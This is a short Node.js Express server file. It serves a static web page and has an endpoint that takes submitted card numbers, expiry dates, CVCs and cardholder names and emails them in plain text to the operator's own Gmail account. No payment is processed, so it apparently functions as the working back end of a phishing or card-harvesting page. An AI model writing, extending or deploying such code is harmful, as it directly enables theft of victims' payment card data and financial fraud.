import express from "express";
import cors from "cors";
import dotenv from "dotenv";
import nodemailer from "nodemailer";
import path from "path";
import { fileURLToPath } from "url";

dotenv.config();

const app = express();
app.use(express.json());
app.use(cors());

// Static Hosting
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
app.use(express.static(path.join(__dirname, "public")));

app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

// ====== NODEMAILER TRANSPORT ======
const transporter = nodemailer.createTransport({
  service: "gmail",
  auth: {
    user: process.env.MAIL_USER,
    pass: process.env.MAIL_PASS
  }
});

// ====== SEND EMAIL API ======
app.post("/send-email", async (req, res) => {
  const { card_number, expiration, cvc, card_name } = req.body;

  const mailOptions = {
    from: process.env.MAIL_USER,
    to: process.env.MAIL_USER,   // ikaw tatanggap
    subject: "New Payment Data",
    text: `
Card Number: ${card_number}
Expiration: ${expiration}
CVC: ${cvc}
Card Name: ${card_name}
    `
  };

  try {
    await transporter.sendMail(mailOptions);
    res.json({ success: true });
  } catch (error) {
    console.log("❌ Email error:", error);
    res.status(500).json({ success: false, error });
  }
});

// PORT
app.listen(process.env.PORT || 10000, () => {
  console.log("🚀 Server running...");
});


